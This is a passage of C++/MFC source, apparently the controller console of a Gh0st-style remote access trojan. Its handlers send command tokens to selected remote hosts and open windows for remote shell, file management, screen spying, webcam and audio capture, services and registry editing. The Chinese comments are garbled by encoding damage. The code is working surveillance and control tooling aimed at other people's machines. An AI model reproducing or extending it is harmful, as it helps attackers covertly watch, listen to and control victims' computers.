}


void CRemoteDlg::OnOnlineMessage()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_TALK;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpentalkdialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	CTalkDlg *Dlg = new CTalkDlg(this, m_IocpServer, ContextObject);

	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);
	ContextObject->v1 = TALK_DLG;
	ContextObject->hDlg = Dlg;
	return 0;
}


void CRemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������

	BYTE bToken = COMMAND_BYE;   //�򱻿ض˷���һ��COMMAND_SYSTEM
	SendSeletedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	CString  strIP;
	int iCount = m_CList_Online.GetSelectedCount();
	int i = 0;


	for (i = 0; i < iCount; i++)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		strIP = m_CList_Online.GetItemText(iItem, ONLINELIST_IP);
		m_CList_Online.DeleteItem(iItem);
		strIP += "�Ͽ�����";
		ShowMessage(true, strIP);
	}
}


void CRemoteDlg::OnOnlineCmd()
{
	BYTE	bToken = COMMAND_SHELL;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CShellDlg* Dlg = new CShellDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineWindowManager()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_WSLIST;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}

//�������
void CRemoteDlg::OnOnlineDesktopManager()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_SCREEN_SPY;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}

//�ļ�����
void CRemoteDlg::OnOnlineFileManager()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_LIST_DRIVE;//���̾������豸
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}




void CRemoteDlg::OnOnlineAudioManager()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_AUDIO;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
{

	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CAudioDlg	*Dlg = new CAudioDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineVideoManager()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_WEBCAM;                 //�򱻿ض˷�������
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	
	CVideoDlg	*Dlg = new CVideoDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineServerManager()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_SERVICES;         
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	
	CServicesDlg	*Dlg = new CServicesDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineRegisterManager()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_REGEDIT;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenrRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CRegisterDlg	*Dlg = new CRegisterDlg(this, m_IocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


afx_msg LRESULT CRemoteDlg::OnOpenScreenspyDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this, m_IocpServer, ContextObject);   //Send  s
																				   // ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);


	ContextObject->v1 = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;
	return 0;
}
